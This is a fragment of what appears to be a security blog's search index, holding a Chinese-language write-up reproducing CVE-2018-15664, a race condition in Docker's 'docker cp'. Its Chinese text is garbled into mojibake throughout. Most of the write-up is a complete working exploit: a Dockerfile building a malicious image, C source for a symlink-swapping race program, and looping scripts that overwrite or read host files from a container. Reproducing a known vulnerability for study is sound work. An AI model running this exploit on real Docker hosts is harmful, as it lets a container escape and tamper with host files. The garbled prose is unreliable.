","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:3","tags":["dockeræ¼æ´"],"title":"CVE-2018-15664æ¼æ´å¤ç°","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"DockerFile ç”¨æ¥åˆ¶ä½œæ¶æ„é•œåƒ æ„å»ºæ¼æ´åˆ©ç”¨ç¨‹åºsymlink_swapå¹¶å°†å…¶æ”¾åœ¨å®¹å™¨æ ¹ç›®å½•ä¸‹ï¼Œå¹¶åœ¨æ ¹ç›®å½•åˆ›å»ºä¸€ä¸ªw00t_w00t_im_ a_flagæ–‡ä»¶ï¼Œå†…å®¹ä¸ºFAlLED-INSIDE CONTAINER PATH å®¹å™¨å¯åŠ¨åæ‰§è¡Œ(Entrypoint)å³ä¸º/symlink_swap # Build the binary. #æ‹‰å–suse linuxçš„åŸºç¡€é•œåƒ FROM opensuse/tumbleweed #å®‰è£…gcc glibc-devel-static RUN zypper in -y gcc glibc-devel-static RUN mkdir /builddir #æ„å»ºæ¼æ´åˆ©ç”¨ç¨‹åºsymlink_swapï¼Œå¹¶å°†å…¶æ”¾åœ¨å®¹å™¨æ ¹ç›®å½•ä¸‹ COPY symlink_swap.c /builddir/symlink_swap.c RUN gcc -Wall -Werror -static -o /builddir/symlink_swap /builddir/symlink_swap.c # Set up our malicious rootfs. FROM opensuse/tumbleweed ARG SYMSWAP_TARGET=/w00t_w00t_im_a_flag ARG SYMSWAP_PATH=/totally_safe_path RUN echo \"FAILED -- INSIDE CONTAINER PATH\" \u003e\"$SYMSWAP_TARGET\" COPY --from=0 /builddir/symlink_swap /symlink_swap #å®¹å™¨å¯åŠ¨åæ‰§è¡Œçš„ç¨‹åºï¼ˆEtrypointï¼‰å³ä¸º/symlink_swap ENTRYPOINT [\"/symlink_swap\"] ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:4","tags":["dockeræ¼æ´"],"title":"CVE-2018-15664æ¼æ´å¤ç°","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"çŸ¥è¯†ç‚¹ï¼š å¤šé˜¶æ®µæ„å»º å¤šä¸ªFROMæŒ‡ä»¤ä¸æ˜¯ä¸ºäº†ç”Ÿæˆå¤šæ ¹çš„å±‚å…³ç³»ï¼Œæœ€åç”Ÿæˆçš„é•œåƒï¼Œä»ä»¥æœ€åä¸€æ¡FROMä¸ºå‡†ï¼Œä¹‹å‰çš„è¢«æŠ›å¼ƒ æ¯ä¸ªFROMæŒ‡ä»¤éƒ½æ˜¯ä¸€ä¸ªæ„å»ºé˜¶æ®µï¼Œå¤šæ¡FROMå°±æ˜¯å¤šé˜¶æ®µæ„å»ºã€‚è™½ç„¶ä¹‹å‰çš„FROMä¼šè¢«æŠ›å¼ƒï¼Œä½†æ˜¯å‰ç½®é˜¶æ®µçš„æ–‡ä»¶æ‹·è´åˆ°åè¾¹çš„é˜¶æ®µä¸­ï¼Œè¿™å°±æ˜¯å¤šé˜¶æ®µæ„å»ºçš„æœ€å¤§æ„ä¹‰ã€‚ è¿™é‡Œåšåˆ°çš„æ•ˆæœå°±æ˜¯å°†ç¼–è¯‘ç¯å¢ƒå’Œè¿è¡Œç¯å¢ƒåˆ†ç¦» æ„å»ºé˜¶æ®µè¿˜å¯ä»¥è¿›è¡Œå‘½åï¼Œå¦‚: # syntax=docker/dockerfile:1 FROM golang:1.16 AS builder WORKDIR /go/src/github.com/alexellis/href-counter/ RUN go get -d -v golang.org/x/net/html COPY app.go ./ RUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app . FROM alpine:latest RUN apk --no-cache add ca-certificates WORKDIR /root/ COPY --from=builder /go/src/github.com/alexellis/href-counter/app ./ CMD [\"./app\"] é»˜è®¤æƒ…å†µä¸‹ï¼Œé˜¶æ®µæ²¡æœ‰å‘½åï¼Œå¯ä»¥é€šè¿‡æ•´æ•°æ¥å¼•ç”¨ä»–ä»¬ï¼Œæ•´æ•°ä»0å¼€å§‹ã€‚ è¿™ç§æƒ…å†µä¸‹ï¼Œå³ä½¿dokcerfileä¸­çš„æŒ‡ä»¤åé¢é‡æ–°æ’åºï¼ŒCOPYä¹Ÿä¸ä¼šä¸­æ–­ã€‚ ARG vs ENV argæ˜¯åœ¨bulidçš„æ—¶å€™å­˜åœ¨ï¼Œå¯ä»¥åœ¨Dockerfile ä¸­å½“ä½œå˜é‡æ¥ä½¿ç”¨(ARGä¸“é—¨ä¸ºæ„å»ºé•œåƒè€Œç”Ÿ) envæ˜¯å®¹å™¨æ„å»ºå¥½ä¹‹åçš„ç¯å¢ƒå˜é‡ï¼Œä¸èƒ½åœ¨Dockerfileä¸­å½“å‚æ•°ä½¿ç”¨ Symlink_swap å®¹å™¨å†…æ¼æ´åˆ©ç”¨æºä»£ç  åœ¨å®¹å™¨å†…åˆ›å»ºæŒ‡å‘æ ¹ç›®å½•â€/â€œçš„ç¬¦å·é“¾æ¥ï¼Œå¹¶ä¸æ–­çš„äº¤æ¢ç¬¦å·é“¾æ¥(ç”±å‘½ä»¤è¡Œå‚æ•°ä¼ å…¥ï¼Œå¦‚â€/totally_safe_pathâ€ï¼‰ä¸ä¸€ä¸ªæ­£å¸¸ç›®å½•(ä¾‹å¦‚â€/totally_safe_path-stashedâ€)çš„åå­—ã€‚è¿™æ ·ä¸€æ¥ï¼Œå®¿ä¸»æœºæ‰§è¡Œdocker cp æ—¶ï¼Œé¦–å…ˆæ£€æŸ¥åˆ°â€/totally_safe_path\"æ˜¯ä¸€ä¸ªæ­£å¸¸ç›®å½•ï¼Œä½†æ˜¯åé¢æ‰§è¡Œå¤åˆ¶æ“ä½œæ—¶â€/totally_safe_path\"å´å˜æˆäº†ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼Œé‚£ä¹ˆDockerå°†åœ¨å®¿ä¸»æœºè§£æè¿™ä¸ªç¬¦å·é“¾æ¥ #define _GNU_SOURCE #include \u003cfcntl.h\u003e #include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e #include \u003csys/types.h\u003e #include \u003csys/stat.h\u003e #include \u003csys/syscall.h\u003e #include \u003cunistd.h\u003e #define usage() \\ do { printf(\"usage: symlink_swap \u003csymlink\u003e\\n\"); exit(1); } while(0) #define bail(msg) \\ do { perror(\"symlink_swap: \" msg); exit(1); } while (0) /* No glibc wrapper for this, so wrap it ourselves. */ #define RENAME_EXCHANGE (1 \u003c\u003c 1) int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, int flags) { return syscall(__NR_renameat2, olddirfd, oldpath, newdirfd, newpath, flags); } /* usage: symlink_swap \u003csymlink\u003e */ int main(int argc, char **argv) { if (argc != 2) usage(); char *symlink_path = argv[1]; char *stash_path = NULL; if (asprintf(\u0026stash_path, \"%s-stashed\", symlink_path) \u003c 0) bail(\"create stash_path\"); /* Create a dummy file at symlink_path. */ struct stat sb = {0}; if (!lstat(symlink_path, \u0026sb)) { int err; if (sb.st_mode \u0026 S_IFDIR) err = rmdir(symlink_path); else err = unlink(symlink_path); if (err \u003c 0) bail(\"unlink symlink_path\"); } /* * Now create a symlink to \"/\" (which will resolve to the host's root if we * win the race) and a dummy directory at stash_path for us to swap with. * We use a directory to remove the possibility of ENOTDIR which reduces * the chance of us winning. */ if (symlink(\"/\", symlink_path) \u003c 0) bail(\"create symlink_path\"); if (mkdir(stash_path, 0755) \u003c 0) bail(\"mkdir stash_path\"); /* Now we do a RENAME_EXCHANGE forever. */ for (;;) { int err = renameat2(AT_FDCWD, symlink_path, AT_FDCWD, stash_path, RENAME_EXCHANGE); if (err \u003c 0) perror(\"symlink_swap: rename exchange failed\"); } return 0; } å±äºç«æ€æ¡ä»¶æ¼æ´ï¼Œä¸æ˜¯æ¯æ¬¡éƒ½èƒ½å¤ç°ï¼Œä¸ºäº†å¢å¤§è§¦å‘å‡ ç‡ï¼Œéœ€è¦åœ¨å®¿ä¸»æœºä¸æ–­æ‰§è¡Œdokcer cpå‘½ä»¤run_read.shå’Œrun_write.shæ¨¡æ‹Ÿå—å®³è€…åœ¨å®¿ä¸»æœºä¸æ–­æ‰§è¡Œdocker cp å‘½ä»¤ run_write.sh å®¿ä¸»æœºcpåˆ°å®¹å™¨å†…çš„åœºæ™¯ï¼Œè§¦å‘æ¼æ´ï¼ŒæŒ‡å®šçš„å®¿ä¸»æœºæ–‡ä»¶å°†è¦†ç›–å®¹å™¨å†…æ¶æ„ç¬¦å·é“¾æ¥ #!/bin/bash SYMSWAP_PATH=/totally_safe_path SYMSWAP_TARGET=/w00t_w00t_im_a_flag # Create our flag. echo \"FAILED -- HOST FILE UNCHANGED\" | sudo tee \"$SYMSWAP_TARGET\" sudo chmod 0444 \"$SYMSWAP_TARGET\" # Run and build the malicious image. docker build -t cyphar/symlink_swap \\ --build-arg \"SYMSWAP_PATH=$SYMSWAP_PATH\" \\ --build-arg \"SYMSWAP_TARGET=$SYMSWAP_TARGET\" build/ ctr_id=$(docker run --rm -d cyphar/symlink_swap \"$SYMSWAP_PATH\") echo \"SUCCESS -- HOST FILE CHANGED\" | tee localpath # Now continually try to copy the files. while true do docker cp localpath \"${ctr_id}:$SYMSWAP_PATH/$SYMSWAP_TARGET\" done run_read.sh æ¨¡æ‹Ÿdocker cpå°†å®¹å™¨å†…æ–‡ä»¶å¤åˆ¶åˆ°å®¿ä¸»æœºä¸Šåœºæ™¯ï¼Œä¸€æ—¦è§¦å‘ï¼Œå®¹å™¨å†…æ¶æ„ç¬¦å·é“¾æ¥åœ¨å®¿ä¸»æœºæ–‡ä»¶ç³»ç»Ÿè§£æåæ‰§è¡Œçš„æ–‡ä»¶å°†è¢«å¤åˆ¶åˆ°å—å®³è€…è®¾å®šçš„å®¿ä¸»æœºç›®å½•ä¸‹ #!/bin/bash SYMSWAP_PATH=/totally_safe_path SYMSWAP_TARGET=/w00t_w00t_im_a_flag # Create our flag. echo \"SUCCESS -- COPIED FROM THE HOST\" | sudo tee \"$SYMSWAP_TARGET\" sudo chmod 000 \"$SYMSWAP_TARGET\" # Run and build the malicious image. docker build -t cyphar/symlink_swap \\ --build-arg \"SYMSWAP_PATH=$SYMSWAP_PATH\" \\ --build-arg \"SYMSWAP_TARGET=$SYMSWAP_TARGET\" build/ ctr_id=$(docker run --rm -d cyphar/symlink_swap \"$SYMSWAP_PATH\") # Now continually try to copy the files. idx=0 while true do mkdir \"ex${idx}\" ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:5","tags":["dockeræ¼æ´"],"title":"CVE-2018-15664æ¼æ´å¤ç°","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":[],"content":" CTF Webã€Misc ä¿¡æ¯å®‰å…¨çˆ±å¥½è€… ç›®å‰ç ”ç©¶æ–¹å‘webå®‰å…¨ã€äº‘åŸç”Ÿå®‰å…¨ é™¤äº†ç”µè„‘ï¼Œä»£ç ï¼Œç½‘ç»œä¹‹å¤–çš„ç”Ÿæ´»ï¼Œä¹Ÿæ˜¯è¦è®¤çœŸå¯¹å¾…ã€‚ è¿˜æœ‰å¾ˆé•¿çš„è·¯è¦èµ°ï¼Œä¸€ç›´åœ¨è·¯ä¸Šã€‚ ","date":"2022-01-09","objectID":"/about/:0:0","tags":[],"title":"About","uri":"/about/"},{"categories":[],"content":" AmiaaaZ https://amiaaaz.github.io/ D3n13d https://d3n13d.github.io/ ","date":"2022-01-09","objectID":"/friends/:0:0","tags":[],"title":"Friends","uri":"/friends/"}]